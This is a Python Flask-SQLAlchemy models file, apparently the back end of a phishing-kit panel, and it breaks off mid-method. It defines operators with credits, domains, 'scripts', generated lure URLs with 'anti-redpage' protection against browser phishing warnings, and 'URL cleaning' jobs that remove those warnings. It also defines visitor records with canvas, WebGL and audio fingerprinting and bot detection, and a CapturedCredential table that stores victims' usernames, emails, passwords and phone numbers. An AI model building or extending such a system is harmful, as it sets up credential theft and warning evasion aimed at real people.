from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
from werkzeug.security import generate_password_hash, check_password_hash
import secrets
import string
import json

db = SQLAlchemy()

class User(db.Model):
    __tablename__ = 'users'
    
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)
    is_admin = db.Column(db.Boolean, default=False, nullable=False)
    is_active = db.Column(db.Boolean, default=True, nullable=False)
    is_banned = db.Column(db.Boolean, default=False, nullable=False)
    is_root = db.Column(db.Boolean, default=False, nullable=False)  # Usuário root do sistema
    require_password_change = db.Column(db.Boolean, default=False, nullable=False)  # Forçar mudança de senha
    credits = db.Column(db.Integer, default=10, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    
    # Campos para integração com Telegram e OTP
    telegram_chat_id = db.Column(db.String(50), nullable=True)
    telegram_username = db.Column(db.String(80), nullable=True)
    otp_enabled = db.Column(db.Boolean, default=False, nullable=False)
    otp_code = db.Column(db.String(6), nullable=True)
    otp_expires_at = db.Column(db.DateTime, nullable=True)
    otp_attempts = db.Column(db.Integer, default=0, nullable=False)
    
    # Campos para autenticação de dois fatores (2FA)
    two_factor_enabled = db.Column(db.Boolean, default=False, nullable=False)
    totp_secret = db.Column(db.String(32), nullable=True)  # Chave secreta TOTP
    totp_secret_temp = db.Column(db.String(32), nullable=True)  # Chave temporária durante configuração
    backup_codes = db.Column(db.Text, nullable=True)  # Códigos de backup separados por vírgula
    last_2fa_used = db.Column(db.DateTime, nullable=True)  # Último uso do 2FA
    
    # Campos de segurança adicional
    failed_login_attempts = db.Column(db.Integer, default=0, nullable=False)
    last_failed_login = db.Column(db.DateTime, nullable=True)
    account_locked_until = db.Column(db.DateTime, nullable=True)
    password_changed_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    last_login_at = db.Column(db.DateTime, nullable=True)
    last_login_ip = db.Column(db.String(45), nullable=True)  # IPv6 support
    
    # Configurações de notificação
    receive_notifications = db.Column(db.Boolean, default=True, nullable=False)
    notification_chat_id = db.Column(db.String(50), nullable=True)  # Chat ID específico para notificações
    
    # Relacionamentos com foreign_keys especificadas para evitar ambiguidade
    generated_urls = db.relationship('GeneratedURL', foreign_keys='GeneratedURL.user_id', backref='user', lazy=True)
    user_domains = db.relationship('UserDomain', foreign_keys='UserDomain.user_id', backref='user', lazy=True)
    granted_domains = db.relationship('UserDomain', foreign_keys='UserDomain.granted_by', backref='granter', lazy=True)
    logs = db.relationship('Log', foreign_keys='Log.user_id', backref='user', lazy=True)
    url_cleanings = db.relationship('URLCleaning', backref='user', lazy=True)
    domain_requests = db.relationship('DomainRequest', foreign_keys='DomainRequest.user_id', backref='user', lazy=True)
    reviewed_requests = db.relationship('DomainRequest', foreign_keys='DomainRequest.reviewed_by', backref='reviewer', lazy=True)

    def set_password(self, password):
        """Define a senha do usuário usando hash"""
        self.password_hash = generate_password_hash(password)
    
    def check_password(self, password):
        """Verifica se a senha fornecida está correta"""
        return check_password_hash(self.password_hash, password)
    
    def generate_otp(self):
        """Gera um código OTP de 6 dígitos"""
        self.otp_code = ''.join(secrets.choice(string.digits) for _ in range(6))
        self.otp_expires_at = datetime.utcnow() + timedelta(minutes=5)  # OTP válido por 5 minutos
        self.otp_attempts = 0
        db.session.commit()
        return self.otp_code
    
    def verify_otp(self, otp_code):
        """Verifica se o código OTP fornecido está correto e não expirou"""
        if not self.otp_code or not self.otp_expires_at:
            return False
        
        # Verificar se o OTP não expirou
        if datetime.utcnow() > self.otp_expires_at:
            self.clear_otp()
            return False
        
        # Verificar número de tentativas
        if self.otp_attempts >= 3:
            self.clear_otp()
            return False
        
        # Verificar se o código está correto
        if self.otp_code == otp_code:
            self.clear_otp()
            return True
        else:
            self.otp_attempts += 1
            # Limpar OTP se atingiu o limite de tentativas
            if self.otp_attempts >= 3:
                self.clear_otp()
            else:
                db.session.commit()
            return False
    
    def clear_otp(self):
        """Limpa o código OTP atual"""
        self.otp_code = None
        self.otp_expires_at = None
        self.otp_attempts = 0
        db.session.commit()
    
    def is_otp_required(self):
        """Verifica se o OTP está habilitado para este usuário"""
        return self.otp_enabled and self.telegram_chat_id is not None
    
    def get_notification_chat_id(self):
        """Retorna o chat ID para notificações (prioriza notification_chat_id)"""
        return self.notification_chat_id or self.telegram_chat_id
    
    def is_authenticated(self):
        """Retorna True se o usuário está autenticado"""
        return True
    
    def is_anonymous(self):
        """Retorna False pois este é um usuário real"""
        return False
    
    def get_id(self):
        """Retorna o ID do usuário como string"""
        return str(self.id)
    
    def is_account_locked(self):
        """Verifica se a conta está bloqueada"""
        if self.account_locked_until:
            return datetime.utcnow() < self.account_locked_until
        return False
    
    def lock_account(self, duration_minutes=30):
        """Bloqueia a conta por um período específico"""
        self.account_locked_until = datetime.utcnow() + timedelta(minutes=duration_minutes)
        db.session.commit()
    
    def unlock_account(self):
        """Desbloqueia a conta"""
        self.account_locked_until = None
        self.failed_login_attempts = 0
        db.session.commit()
    
    def record_failed_login(self):
        """Registra tentativa de login falhada"""
        self.failed_login_attempts += 1
        self.last_failed_login = datetime.utcnow()
        
        # Bloquear conta após 5 tentativas falhadas
        if self.failed_login_attempts >= 5:
            self.lock_account(30)  # 30 minutos
        
        db.session.commit()
    
    def record_successful_login(self, ip_address=None):
        """Registra login bem-sucedido"""
        self.failed_login_attempts = 0
        self.last_failed_login = None
        self.last_login_at = datetime.utcnow()
        if ip_address:
            self.last_login_ip = ip_address
        db.session.commit()
    
    def is_password_expired(self, max_age_days=90):
        """Verifica se a senha está expirada"""
        if not self.password_changed_at:
            return True
        
        expiry_date = self.password_changed_at + timedelta(days=max_age_days)
        return datetime.utcnow() > expiry_date
    
    def update_password(self, new_password):
        """Atualiza senha e registra timestamp"""
        self.set_password(new_password)
        self.password_changed_at = datetime.utcnow()
        self.require_password_change = False
        db.session.commit()
    
    def is_2fa_enabled(self):
        """Verifica se 2FA está habilitado"""
        return self.two_factor_enabled and self.totp_secret is not None
    
    def requires_2fa(self):
        """Verifica se 2FA é obrigatório para este usuário"""
        # 2FA obrigatório para administradores
        return self.is_admin
    
    def record_2fa_usage(self):
        """Registra uso do 2FA"""
        self.last_2fa_used = datetime.utcnow()
        db.session.commit()
    
    def get_security_score(self):
        """Calcula pontuação de segurança do usuário (0-100)"""
        score = 0
        
        # Senha forte (25 pontos)
        if self.password_changed_at and not self.is_password_expired():
            score += 25
        
        # 2FA habilitado (30 pontos)
        if self.is_2fa_enabled():
            score += 30
        
        # Conta ativa e não banida (20 pontos)
        if self.is_active and not self.is_banned:
            score += 20
        
        # Sem tentativas de login falhadas recentes (15 pontos)
        if self.failed_login_attempts == 0:
            score += 15
        
        # Login recente (10 pontos)
        if self.last_login_at and (datetime.utcnow() - self.last_login_at).days < 30:
            score += 10
        
        return min(score, 100)
    
    def get_security_recommendations(self):
        """Retorna recomendações de segurança para o usuário"""
        recommendations = []
        
        if not self.is_2fa_enabled() and self.is_admin:
            recommendations.append("Habilite a autenticação de dois fatores (2FA) para maior segurança")
        
        if self.is_password_expired():
            recommendations.append("Sua senha está expirada. Altere-a imediatamente")
        
        if self.failed_login_attempts > 0:
            recommendations.append("Foram detectadas tentativas de login falhadas. Verifique sua conta")
        
        if not self.last_login_at or (datetime.utcnow() - self.last_login_at).days > 90:
            recommendations.append("Faça login regularmente para manter sua conta ativa")
        
        return recommendations

    def __repr__(self):
        return f'<User {self.username}>'

    def to_dict(self):
        return {
            'id': self.id,
            'username': self.username,
            'email': self.email,
            'is_admin': self.is_admin,
            'credits': self.credits,
            'is_banned': self.is_banned,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'telegram_username': self.telegram_username,
            'otp_enabled': self.otp_enabled,
            'telegram_configured': self.telegram_chat_id is not None,
            'receive_notifications': self.receive_notifications,
            'two_factor_enabled': self.two_factor_enabled,
            'account_locked': self.is_account_locked(),
            'password_expired': self.is_password_expired(),
            'security_score': self.get_security_score(),
            'last_login_at': self.last_login_at.isoformat() if self.last_login_at else None
        }

class Domain(db.Model):
    __tablename__ = 'domains'
    
    id = db.Column(db.Integer, primary_key=True)
    domain_name = db.Column(db.String(255), unique=True, nullable=False)
    is_active = db.Column(db.Boolean, default=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    
    # Configurações avançadas do domínio
    max_users = db.Column(db.Integer, default=100, nullable=False)  # Máximo de usuários que podem usar
    requires_approval = db.Column(db.Boolean, default=True, nullable=False)  # Requer aprovação para uso
    is_premium = db.Column(db.Boolean, default=False, nullable=False)  # Domínio premium
    cost_per_use = db.Column(db.Integer, default=1, nullable=False)  # Créditos por uso
    
    # Monitoramento
    total_urls_generated = db.Column(db.Integer, default=0, nullable=False)
    last_used = db.Column(db.DateTime, nullable=True)
    status_check_url = db.Column(db.String(512), nullable=True)  # URL para verificar status
    last_status_check = db.Column(db.DateTime, nullable=True)
    is_online = db.Column(db.Boolean, default=True, nullable=False)
    
    # Configurações de segurança
    allowed_countries = db.Column(db.Text, nullable=True)  # JSON com países permitidos
    blocked_ips = db.Column(db.Text, nullable=True)  # JSON com IPs bloqueados
    rate_limit_per_hour = db.Column(db.Integer, default=1000, nullable=False)
    
    # Configurações de DNS
    dns_provider = db.Column(db.String(50), nullable=True)  # cloudflare, route53, godaddy, etc.
    dns_zone_id = db.Column(db.String(100), nullable=True)  # ID da zona DNS
    dns_api_key = db.Column(db.String(255), nullable=True)  # Chave da API do DNS
    dns_api_secret = db.Column(db.String(255), nullable=True)  # Secret da API do DNS
    auto_dns_management = db.Column(db.Boolean, default=False, nullable=False)  # Gerenciamento automático
    dns_last_sync = db.Column(db.DateTime, nullable=True)  # Última sincronização DNS
    dns_status = db.Column(db.String(20), default='pending', nullable=False)  # pending, configured, error
    
    # Relacionamentos
    user_domains = db.relationship('UserDomain', backref='domain', lazy=True)
    generated_urls = db.relationship('GeneratedURL', backref='domain', lazy=True)
    domain_requests = db.relationship('DomainRequest', backref='domain', lazy=True)
    dns_records = db.relationship('DNSRecord', backref='domain', lazy=True, cascade='all, delete-orphan')

    def __repr__(self):
        return f'<Domain {self.domain_name}>'

    def to_dict(self):
        return {
            'id': self.id,
            'domain_name': self.domain_name,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'max_users': self.max_users,
            'requires_approval': self.requires_approval,
            'is_premium': self.is_premium,
            'cost_per_use': self.cost_per_use,
            'total_urls_generated': self.total_urls_generated,
            'last_used': self.last_used.isoformat() if self.last_used else None,
            'is_online': self.is_online,
            'last_status_check': self.last_status_check.isoformat() if self.last_status_check else None,
            'current_users': len(self.user_domains),
            'rate_limit_per_hour': self.rate_limit_per_hour,
            'dns_provider': self.dns_provider,
            'auto_dns_management': self.auto_dns_management,
            'dns_status': self.dns_status,
            'dns_last_sync': self.dns_last_sync.isoformat() if self.dns_last_sync else None
        }

class DNSRecord(db.Model):
    __tablename__ = 'dns_records'
    
    id = db.Column(db.Integer, primary_key=True)
    domain_id = db.Column(db.Integer, db.ForeignKey('domains.id'), nullable=False)
    record_type = db.Column(db.String(10), nullable=False)  # A, CNAME, TXT, MX, etc.
    name = db.Column(db.String(255), nullable=False)  # Nome do registro (ex: www, @, mail)
    value = db.Column(db.Text, nullable=False)  # Valor do registro
    ttl = db.Column(db.Integer, default=300, nullable=False)  # Time to Live
    priority = db.Column(db.Integer, nullable=True)  # Para registros MX
    
    # Controle de sincronização
    is_synced = db.Column(db.Boolean, default=False, nullable=False)
    external_id = db.Column(db.String(100), nullable=True)  # ID no provedor DNS
    last_sync = db.Column(db.DateTime, nullable=True)
    sync_error = db.Column(db.Text, nullable=True)
    
    # Metadados
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow, nullable=False)
    is_active = db.Column(db.Boolean, default=True, nullable=False)

    def __repr__(self):
        return f'<DNSRecord {self.name}.{self.domain.domain_name} {self.record_type}>'

    def to_dict(self):
        return {
            'id': self.id,
            'domain_id': self.domain_id,
            'record_type': self.record_type,
            'name': self.name,
            'value': self.value,
            'ttl': self.ttl,
            'priority': self.priority,
            'is_synced': self.is_synced,
            'external_id': self.external_id,
            'last_sync': self.last_sync.isoformat() if self.last_sync else None,
            'sync_error': self.sync_error,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'updated_at': self.updated_at.isoformat() if self.updated_at else None,
            'is_active': self.is_active
        }

class UserDomain(db.Model):
    __tablename__ = 'user_domains'
    
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), primary_key=True)
    domain_id = db.Column(db.Integer, db.ForeignKey('domains.id'), primary_key=True)
    granted_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    granted_by = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)  # Admin que aprovou
    expires_at = db.Column(db.DateTime, nullable=True)  # Acesso temporário
    usage_count = db.Column(db.Integer, default=0, nullable=False)  # Quantas URLs geradas
    last_used = db.Column(db.DateTime, nullable=True)

    def to_dict(self):
        return {
            'user_id': self.user_id,
            'domain_id': self.domain_id,
            'granted_at': self.granted_at.isoformat() if self.granted_at else None,
            'granted_by': self.granted_by,
            'expires_at': self.expires_at.isoformat() if self.expires_at else None,
            'usage_count': self.usage_count,
            'last_used': self.last_used.isoformat() if self.last_used else None,
            'is_expired': self.expires_at and datetime.utcnow() > self.expires_at if self.expires_at else False
        }

class DomainRequest(db.Model):
    __tablename__ = 'domain_requests'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    domain_id = db.Column(db.Integer, db.ForeignKey('domains.id'), nullable=False)
    reason = db.Column(db.Text, nullable=False)
    status = db.Column(db.String(20), default='pending', nullable=False)  # pending, approved, rejected
    
    # Timestamps
    requested_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    reviewed_at = db.Column(db.DateTime, nullable=True)
    reviewed_by = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
    
    # Resposta do admin
    admin_response = db.Column(db.Text, nullable=True)
    
    # Configurações da solicitação
    requested_duration_days = db.Column(db.Integer, nullable=True)  # Duração solicitada em dias
    priority = db.Column(db.String(10), default='normal', nullable=False)  # low, normal, high, urgent

    def __repr__(self):
        return f'<DomainRequest {self.id} - {self.status}>'

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'domain_id': self.domain_id,
            'reason': self.reason,
            'status': self.status,
            'requested_at': self.requested_at.isoformat() if self.requested_at else None,
            'reviewed_at': self.reviewed_at.isoformat() if self.reviewed_at else None,
            'reviewed_by': self.reviewed_by,
            'admin_response': self.admin_response,
            'requested_duration_days': self.requested_duration_days,
            'priority': self.priority,
            'user': self.user.to_dict() if self.user else None,
            'domain': self.domain.to_dict() if self.domain else None
        }

class Script(db.Model):
    __tablename__ = 'scripts'
    
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(255), unique=True, nullable=False)
    description = db.Column(db.Text)
    file_path = db.Column(db.String(255), nullable=False)
    is_active = db.Column(db.Boolean, default=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    
    # Relacionamentos
    generated_urls = db.relationship('GeneratedURL', backref='script', lazy=True)

    def __repr__(self):
        return f'<Script {self.name}>'

    def to_dict(self):
        return {
            'id': self.id,
            'name': self.name,
            'description': self.description,
            'file_path': self.file_path,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat() if self.created_at else None
        }

class GeneratedURL(db.Model):
    __tablename__ = 'generated_urls'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    script_id = db.Column(db.Integer, db.ForeignKey('scripts.id'), nullable=False)
    domain_id = db.Column(db.Integer, db.ForeignKey('domains.id'), nullable=False)
    unique_suffix = db.Column(db.String(32), unique=True, nullable=False)
    full_url = db.Column(db.String(512), unique=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    
    # Estatísticas de acesso
    access_count = db.Column(db.Integer, default=0, nullable=False)
    last_access = db.Column(db.DateTime, nullable=True)
    
    # Proteção anti-redpage
    is_protected = db.Column(db.Boolean, default=True, nullable=False)
    protection_level = db.Column(db.String(20), default='medium', nullable=False)  # low, medium, high
    
    # Configurações adicionais
    expires_at = db.Column(db.DateTime, nullable=True)  # Data de expiração
    custom_title = db.Column(db.String(255), nullable=True)  # Título personalizado
    custom_description = db.Column(db.Text, nullable=True)  # Descrição personalizada
    
    # Relacionamentos
    visitors = db.relationship('Visitor', backref='generated_url', lazy=True, cascade='all, delete-orphan')

    def __repr__(self):
        return f'<GeneratedURL {self.full_url}>'

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'script_id': self.script_id,
            'domain_id': self.domain_id,
            'unique_suffix': self.unique_suffix,
            'full_url': self.full_url,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'access_count': self.access_count,
            'last_access': self.last_access.isoformat() if self.last_access else None,
            'is_protected': self.is_protected,
            'protection_level': self.protection_level,
            'expires_at': self.expires_at.isoformat() if self.expires_at else None,
            'custom_title': self.custom_title,
            'custom_description': self.custom_description
        }

class Visitor(db.Model):
    __tablename__ = 'visitors'
    
    id = db.Column(db.Integer, primary_key=True)
    generated_url_id = db.Column(db.Integer, db.ForeignKey('generated_urls.id'), nullable=False)
    
    # Informações de IP e localização
    ip_address = db.Column(db.String(45), nullable=False)  # Suporta IPv6
    country = db.Column(db.String(100), nullable=True)
    region = db.Column(db.String(100), nullable=True)
    city = db.Column(db.String(100), nullable=True)
    isp = db.Column(db.String(255), nullable=True)
    
    # Informações do navegador e sistema
    user_agent = db.Column(db.Text, nullable=True)
    browser_name = db.Column(db.String(100), nullable=True)
    browser_version = db.Column(db.String(50), nullable=True)
    os_name = db.Column(db.String(100), nullable=True)
    os_version = db.Column(db.String(50), nullable=True)
    device_type = db.Column(db.String(50), nullable=True)  # desktop, mobile, tablet
    
    # Informações de rede
    referer = db.Column(db.Text, nullable=True)
    language = db.Column(db.String(10), nullable=True)
    timezone = db.Column(db.String(50), nullable=True)
    
    # Informações técnicas
    screen_resolution = db.Column(db.String(20), nullable=True)
    color_depth = db.Column(db.Integer, nullable=True)
    java_enabled = db.Column(db.Boolean, nullable=True)
    cookies_enabled = db.Column(db.Boolean, nullable=True)
    
    # Timestamps
    first_visit = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    last_visit = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    visit_count = db.Column(db.Integer, default=1, nullable=False)
    
    # Dados capturados (formulários, etc.)
    captured_data = db.Column(db.Text, nullable=True)  # JSON string
    
    # Detecção de bot
    is_bot = db.Column(db.Boolean, default=False, nullable=False)
    bot_score = db.Column(db.Float, default=0.0, nullable=False)  # 0.0 = humano, 1.0 = bot
    bot_indicators = db.Column(db.Text, nullable=True)  # JSON com indicadores de bot
    
    # Fingerprinting avançado
    fingerprint_hash = db.Column(db.String(64), nullable=True)
    canvas_fingerprint = db.Column(db.String(64), nullable=True)
    webgl_fingerprint = db.Column(db.String(64), nullable=True)
    audio_fingerprint = db.Column(db.String(64), nullable=True)
    
    def __repr__(self):
        return f'<Visitor {self.ip_address} - {self.generated_url_id}>'

    def to_dict(self):
        return {
            'id': self.id,
            'generated_url_id': self.generated_url_id,
            'ip_address': self.ip_address,
            'country': self.country,
            'region': self.region,
            'city': self.city,
            'isp': self.isp,
            'user_agent': self.user_agent,
            'browser_name': self.browser_name,
            'browser_version': self.browser_version,
            'os_name': self.os_name,
            'os_version': self.os_version,
            'device_type': self.device_type,
            'referer': self.referer,
            'language': self.language,
            'timezone': self.timezone,
            'screen_resolution': self.screen_resolution,
            'color_depth': self.color_depth,
            'java_enabled': self.java_enabled,
            'cookies_enabled': self.cookies_enabled,
            'first_visit': self.first_visit.isoformat() if self.first_visit else None,
            'last_visit': self.last_visit.isoformat() if self.last_visit else None,
            'visit_count': self.visit_count,
            'captured_data': self.captured_data,
            'is_bot': self.is_bot,
            'bot_score': self.bot_score,
            'bot_indicators': self.bot_indicators,
            'fingerprint_hash': self.fingerprint_hash
        }

class Log(db.Model):
    __tablename__ = 'logs'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
    action = db.Column(db.String(255), nullable=False)
    details = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    
    # Informações adicionais para logs de visitantes
    visitor_id = db.Column(db.Integer, db.ForeignKey('visitors.id'), nullable=True)
    ip_address = db.Column(db.String(45), nullable=True)
    
    # Campos de segurança adicionais
    user_agent = db.Column(db.String(255), nullable=True)
    session_id = db.Column(db.String(64), nullable=True)
    severity = db.Column(db.String(20), default='info', nullable=False)  # info, warning, error, critical
    category = db.Column(db.String(50), default='general', nullable=False)  # login, admin, security, api, etc.
    risk_score = db.Column(db.Integer, default=0, nullable=False)  # 0-100
    
    # Metadados adicionais em JSON
    extra_data = db.Column(db.Text, nullable=True)  # JSON com dados extras

    def __repr__(self):
        return f'<Log {self.action}>'

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'action': self.action,
            'details': self.details,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'visitor_id': self.visitor_id,
            'ip_address': self.ip_address,
            'user_agent': self.user_agent,
            'session_id': self.session_id,
            'severity': self.severity,
            'category': self.category,
            'risk_score': self.risk_score,
            'extra_data': self.extra_data
        }

class SystemConfig(db.Model):
    __tablename__ = 'system_config'
    
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(100), unique=True, nullable=False)
    value = db.Column(db.Text, nullable=True)
    description = db.Column(db.Text, nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow, nullable=False)

    def __repr__(self):
        return f'<SystemConfig {self.key}>'

    def to_dict(self):
        return {
            'id': self.id,
            'key': self.key,
            'value': self.value,
            'description': self.description,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'updated_at': self.updated_at.isoformat() if self.updated_at else None
        }

class URLCleaning(db.Model):
    __tablename__ = 'url_cleanings'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    original_url = db.Column(db.Text, nullable=False)
    cleaned_url = db.Column(db.Text, nullable=True)
    status = db.Column(db.String(20), default='pending', nullable=False)  # pending, processing, completed, failed
    cleaning_type = db.Column(db.String(50), nullable=False)  # redpage_removal, bot_protection, full_clean
    
    # Resultados da limpeza
    issues_found = db.Column(db.Text, nullable=True)  # JSON com problemas encontrados
    actions_taken = db.Column(db.Text, nullable=True)  # JSON com ações realizadas
    
    # Timestamps
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    completed_at = db.Column(db.DateTime, nullable=True)
    
    def __repr__(self):
        return f'<URLCleaning {self.id} - {self.status}>'

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'original_url': self.original_url,
            'cleaned_url': self.cleaned_url,
            'status': self.status,
            'cleaning_type': self.cleaning_type,
            'issues_found': self.issues_found,
            'actions_taken': self.actions_taken,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'completed_at': self.completed_at.isoformat() if self.completed_at else None
        }

class BlacklistedIP(db.Model):
    __tablename__ = 'blacklisted_ips'
    
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(45), unique=True, nullable=False)
    reason = db.Column(db.String(255), nullable=False)
    added_by = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=True)
    is_active = db.Column(db.Boolean, default=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    expires_at = db.Column(db.DateTime, nullable=True)

    def __repr__(self):
        return f'<BlacklistedIP {self.ip_address}>'

    def to_dict(self):
        return {
            'id': self.id,
            'ip_address': self.ip_address,
            'reason': self.reason,
            'added_by': self.added_by,
            'is_active': self.is_active,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'expires_at': self.expires_at.isoformat() if self.expires_at else None
        }

class SuspiciousActivity(db.Model):
    __tablename__ = 'suspicious_activities'
    
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(45), nullable=False)
    user_agent = db.Column(db.Text, nullable=True)
    activity_type = db.Column(db.String(100), nullable=False)  # bot_detected, rapid_requests, suspicious_pattern
    severity = db.Column(db.String(20), default='medium', nullable=False)  # low, medium, high, critical
    details = db.Column(db.Text, nullable=True)  # JSON com detalhes da atividade
    
    # Relacionamento com visitante (se aplicável)
    visitor_id = db.Column(db.Integer, db.ForeignKey('visitors.id'), nullable=True)
    
    # Timestamps
    detected_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    resolved_at = db.Column(db.DateTime, nullable=True)
    is_resolved = db.Column(db.Boolean, default=False, nullable=False)

    def __repr__(self):
        return f'<SuspiciousActivity {self.activity_type} - {self.ip_address}>'

    def to_dict(self):
        return {
            'id': self.id,
            'ip_address': self.ip_address,
            'user_agent': self.user_agent,
            'activity_type': self.activity_type,
            'severity': self.severity,
            'details': self.details,
            'visitor_id': self.visitor_id,
            'detected_at': self.detected_at.isoformat() if self.detected_at else None,
            'resolved_at': self.resolved_at.isoformat() if self.resolved_at else None,
            'is_resolved': self.is_resolved
        }


class Notification(db.Model):
    __tablename__ = 'notifications'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    title = db.Column(db.String(200), nullable=False)
    message = db.Column(db.Text, nullable=False)
    type = db.Column(db.String(20), default='info', nullable=False)  # success, warning, error, info
    priority = db.Column(db.String(20), default='normal', nullable=False)  # low, normal, high, urgent
    
    # Status da notificação
    is_read = db.Column(db.Boolean, default=False, nullable=False)
    is_dismissed = db.Column(db.Boolean, default=False, nullable=False)
    
    # Dados adicionais (JSON)
    data = db.Column(db.Text, nullable=True)  # JSON com dados extras da notificação
    
    # Ação relacionada (opcional)
    action_url = db.Column(db.String(500), nullable=True)  # URL para ação relacionada
    action_text = db.Column(db.String(100), nullable=True)  # Texto do botão de ação
    
    # Timestamps
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    read_at = db.Column(db.DateTime, nullable=True)
    expires_at = db.Column(db.DateTime, nullable=True)  # Notificações podem expirar
    
    # Relacionamento
    user = db.relationship('User', backref='notifications', lazy=True)

    def mark_as_read(self):
        """Marca a notificação como lida"""
        self.is_read = True
        self.read_at = datetime.utcnow()

    def dismiss(self):
        """Descarta a notificação"""
        self.is_dismissed = True

    def is_expired(self):
        """Verifica se a notificação expirou"""
        if self.expires_at:
            return datetime.utcnow() > self.expires_at
        return False

    def get_data(self):
        """Retorna os dados extras como dict"""
        if self.data:
            try:
                return json.loads(self.data)
            except:
                return {}
        return {}

    def set_data(self, data_dict):
        """Define os dados extras como JSON"""
        self.data = json.dumps(data_dict) if data_dict else None

    def __repr__(self):
        return f'<Notification {self.title} - {self.user.username}>'

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'title': self.title,
            'message': self.message,
            'type': self.type,
            'priority': self.priority,
            'is_read': self.is_read,
            'is_dismissed': self.is_dismissed,
            'data': self.get_data(),
            'action_url': self.action_url,
            'action_text': self.action_text,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'read_at': self.read_at.isoformat() if self.read_at else None,
            'expires_at': self.expires_at.isoformat() if self.expires_at else None,
            'is_expired': self.is_expired()
        }



class CapturedCredential(db.Model):
    __tablename__ = 'captured_credentials'
    
    id = db.Column(db.Integer, primary_key=True)
    visitor_id = db.Column(db.Integer, db.ForeignKey('visitors.id'), nullable=False)
    generated_url_id = db.Column(db.Integer, db.ForeignKey('generated_urls.id'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    
    # Dados capturados (criptografados)
    username = db.Column(db.Text, nullable=True)  # Criptografado
    email = db.Column(db.Text, nullable=True)     # Criptografado
    password = db.Column(db.Text, nullable=True)  # Criptografado
    phone = db.Column(db.Text, nullable=True)     # Criptografado
    
    # Metadados
    field_names = db.Column(db.Text, nullable=True)  # JSON com nomes dos campos
    form_data = db.Column(db.Text, nullable=True)    # JSON com dados extras
    
    # Informações de contexto
    script_name = db.Column(db.String(200), nullable=True)
    domain_used = db.Column(db.String(200), nullable=True)
    capture_method = db.Column(db.String(50), default='form', nullable=False)  # form, ajax, etc
    
    # Status e flags
    is_verified = db.Column(db.Boolean, default=False, nullable=False)
    is_anonymized = db.Column(db.Boolean, default=False, nullable=False)
    is_exported = db.Column(db.Boolean, default=False, nullable=False)
    
    # Timestamps
    captured_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    verified_at = db.Column(db.DateTime, nullable=True)
    exported_at = db.Column(db.DateTime, nullable=True)
    
    # Relacionamentos
    visitor = db.relationship('Visitor', backref='captured_credentials', lazy=True)
    generated_url = db.relationship('GeneratedURL', backref='captured_credentials', lazy=True)
    user = db.relationship('User', backref='captured_credentials', lazy=True)

    def encrypt_field(self, value):
        """Criptografa um campo sensível"""
        if not value:
            return None
        try:
            from cryptography.fernet import Fernet
            import os
            
            # Usar chave do ambiente ou gerar uma
            key = os.environ.get('ENCRYPTION_KEY', Fernet.generate_key())
            if isinstance(key, str):
                key = key.encode()
            
            f = Fernet(key)
            return f.encrypt(value.encode()).decode()
        except:
            return value  # Fallback sem criptografia

    def decrypt_field(self, encrypted_value):
